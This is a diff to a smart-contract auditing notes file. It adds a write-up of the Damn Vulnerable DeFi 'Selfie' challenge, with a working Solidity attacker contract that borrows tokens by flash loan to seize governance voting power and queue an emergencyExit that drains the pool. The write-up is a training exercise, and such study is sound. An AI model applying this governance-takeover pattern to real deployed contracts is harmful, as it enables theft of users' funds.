@@ -39,7 +39,9 @@
   - [Unbounded gas consumption](#unbounded-gas-consumption)
   - [Maximal Extractable Value (MEV)](#maximal-extractable-value-mev)
   - [Governance Attack](#governance-attack)
-
+- [Challenges solved](#challenges-solved)
+  - [Damn Vulnerable DeFi](#damn-vulnerable-defi)
+    - [Selfie](#selfie) 
 
 ## Introduction
 
@@ -409,7 +411,7 @@ C. Reporting
     - A cool tool for this purpose is [Solidity Code Metrics](https://github.com/Consensys/solidity-metrics)
 4. Look at the code, see how you can break it
     - Take notes, in the code and in a file `.md`
-      - Use the markers like `@audit`, `@audit-info`, `@audit-ok`, `@audit-issue`
+      - Use markers like `@audit`, `@audit-info`, `@audit-ok`, `@audit-issue`
     - Don’t get stuck in rabbit holes
     - Use Foundry to write tests, especially if some are missing. Also run chisel to understand what some portions of code do
     - Look at the docs again to see if everything is correct, which functions might be more vulnerable etc.
@@ -939,3 +941,89 @@ Resources:
 ### Governance Attack
 
 - Case study: [Rekt - Tornado Cash Governance](https://rekt.news/tornado-gov-rekt/)
+
+
+## Challenges solved
+
+### Damn Vulnerable DeFi
+
+#### Selfie
+
+Issue: the function `emergencyExit(address receiver)` in the `SelfiePool` contract transfers the entire balance of the contract to the specified address. By using a flash loan to acquire the necessary voting power, it is possible to queue the action `emergencyExit(address)` targeting a specific address, in this case `recovery`. After queuing the action, wait for the required delay before calling `executeAction(actionId)` to meet the conditions. This will transfer the contract’s balance to the specified address.
+
+```Solidity
+...
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
+
+...
+
+    function test_selfie() public checkSolvedByPlayer {
+        SelfieAttacker selfieAttacker = new SelfieAttacker(
+            pool,
+            token,
+            governance,
+            recovery
+        );
+        selfieAttacker.attack();
+
+        // execute the action
+        vm.warp(block.timestamp + 2 days + 1);
+        governance.executeAction(1);
+    }
+
+...
+
+contract SelfieAttacker is IERC3156FlashBorrower {
+    SelfiePool public pool;
+    DamnValuableVotes public token;
+    SimpleGovernance public governance;
+    address player;
+    address recovery;
+
+    constructor(
+        SelfiePool _pool,
+        DamnValuableVotes _token,
+        SimpleGovernance _governance,
+        address _recovery
+    ) {
+        pool = _pool;
+        token = _token;
+        governance = _governance;
+        player = msg.sender;
+        recovery = _recovery;
+    }
+
+    function attack() public {
+        bytes memory data = abi.encodeWithSignature(
+            "emergencyExit(address)",
+            recovery
+        );
+
+        pool.flashLoan(
+            IERC3156FlashBorrower(address(this)),
+            address(token),
+            pool.maxFlashLoan(address(token)),
+            data
+        );
+    }
+
+    function onFlashLoan(
+        address,
+        address,
+        uint256 _amount,
+        uint256,
+        bytes calldata data
+    ) external returns (bytes32) {
+        require(msg.sender == address(pool), "msg.sender is not pool");
+        require(tx.origin == player, "tx.origin is not player");
+
+        token.delegate(address(this)); // with this operation, I get the voting power
+        governance.queueAction(address(pool), 0, data); // queue the action
+
+        // return the loan
+        token.approve(address(pool), _amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+}
+```
